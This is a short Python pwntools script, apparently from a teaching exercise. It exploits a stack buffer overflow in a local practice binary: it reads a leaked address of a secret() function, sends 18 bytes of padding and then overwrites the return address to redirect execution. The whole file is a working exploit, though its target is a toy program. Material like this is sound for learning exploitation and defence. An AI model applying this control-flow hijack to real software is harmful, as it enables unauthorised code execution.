#!/bin/python3
# This is the clean exploit code that will overwrite rsp so that the secret() function will be executed next.
import pwn
import os

# pty is required to circumvent cashing
pty = pwn.process.PTY
file_dir = os.path.abspath(os.path.dirname(__file__))
p = pwn.process(f"{file_dir}/../c/buffer_overflow", stdin=pty, stdout=pty)

# The first output of the process is the address to the secret function
# This address can also be extracted with gdb when ASLR is disabled.
# To do so attach gdb to the process and run `p secret`, where secret is the name of the function.
address = p.recvline(timeout=1)
rip = pwn.p64(int(address[2:-1], base=16))

required_offset = 18
padding = b"A" * required_offset

input_prompt = b"Enter password:"
p.recvuntil(input_prompt, timeout=1)
p.sendline(padding + rip)

final_output = p.recvall(timeout=2)
if final_output:
    print(final_output)
else:
    print("There was no output, couldn't get the secret value :(")
